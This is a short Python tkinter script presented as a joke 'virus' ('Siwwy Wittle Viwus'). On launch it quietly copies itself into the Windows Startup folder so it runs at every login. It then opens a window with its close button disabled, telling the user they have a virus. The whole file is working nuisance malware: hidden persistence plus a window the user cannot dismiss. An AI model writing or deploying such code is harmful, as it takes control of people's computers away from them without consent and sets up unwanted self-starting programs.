import tkinter as tk
from tkinter import font
import os
import shutil
import sys

# Get the current script's path
script_path = os.path.abspath(__file__)

# Get the user's startup folder path
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

# Check if the script is already in the startup folder
startup_script_path = os.path.join(startup_folder, os.path.basename(script_path))
if os.path.exists(startup_script_path):
    print(" ")

else:
    # Copy the script to the startup folder
    shutil.copy2(script_path, startup_script_path)


def disable_close_button():
    pass

root = tk.Tk()
root.title("Siwwy Wittle Viwus")

# Disable window close button
root.protocol("WM_DELETE_WINDOW", disable_close_button)

# Remove the minimize and maximize buttons
root.attributes('-toolwindow', 1)

# Remove the maximize button from the window decorations
root.resizable(False, False)

# Create a bold font
bold_font = font.Font(weight="bold")

label = tk.Label(root, text="Hello! \n Im here to remind you 'you have a virus'... \n That virus is me <3", fg="red", font=bold_font)
label.pack()

root.mainloop()
